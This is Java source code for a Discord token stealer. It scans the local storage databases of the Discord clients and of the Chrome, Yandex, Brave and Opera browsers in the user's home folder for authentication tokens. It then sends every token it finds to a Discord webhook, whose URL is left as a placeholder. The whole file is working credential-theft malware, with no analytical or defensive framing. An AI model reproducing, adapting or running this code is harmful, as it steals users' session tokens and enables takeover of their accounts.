import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class Main
{

	public static String webhookURL = "WEBHOOK_URL";
	public static String avatarURL = "WEBHOOK_NICKNAME";
	public static String webhookNickname = "WEBHOOK_AVATAR_URL";
	
	public static void main(String[] args) {
		Webhook webhook1 = new Webhook(webhookURL);
		webhook1.setUsername(avatarURL);
		webhook1.setAvatarUrl(webhookNickname);
		StringBuilder sb = new StringBuilder();
		for (String s : getTokens()) {
			sb.append(":small_orange_diamond: [TOKEN] " + s + "\\n");
		}
		webhook1.setContent(sb.toString());
		try {
			webhook1.execute();
		} catch (IOException e) {
		}
	}

	public static ArrayList<String> getTokens() {
		ArrayList<String> temp = new ArrayList<>();
		ArrayList<File> paths = new ArrayList<>();
		paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Discord/Local Storage/leveldb/"));
		paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/"));
		paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/"));
		paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/"));
		paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/"));
		paths.add(new File(System.getProperty("user.home") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/"));
		paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb/"));
		for (File file : paths) {
			if (!file.exists() || file == null) {
				continue;
			}
			for (String pathname : file.list()) {
				try {
					BufferedReader br = new BufferedReader(new InputStreamReader(
							new DataInputStream(new FileInputStream(file.getAbsolutePath() + "/" + pathname))));
					String strLine;
					int index;
					while ((strLine = br.readLine()) != null) {
						while ((index = strLine.indexOf("oken")) != -1) {
							strLine = strLine.substring(index + "oken".length()+1);
							String token = strLine.split("\"")[1];
							if (!temp.contains(token)) {
								if(token.split("\\.").length != 0 && token.split("\\.").length >=2)
								temp.add("" + token);
							}
						}
					}
					br.close();
				} catch (Exception ex) {
				}
			}
		}
		return temp;
	}
}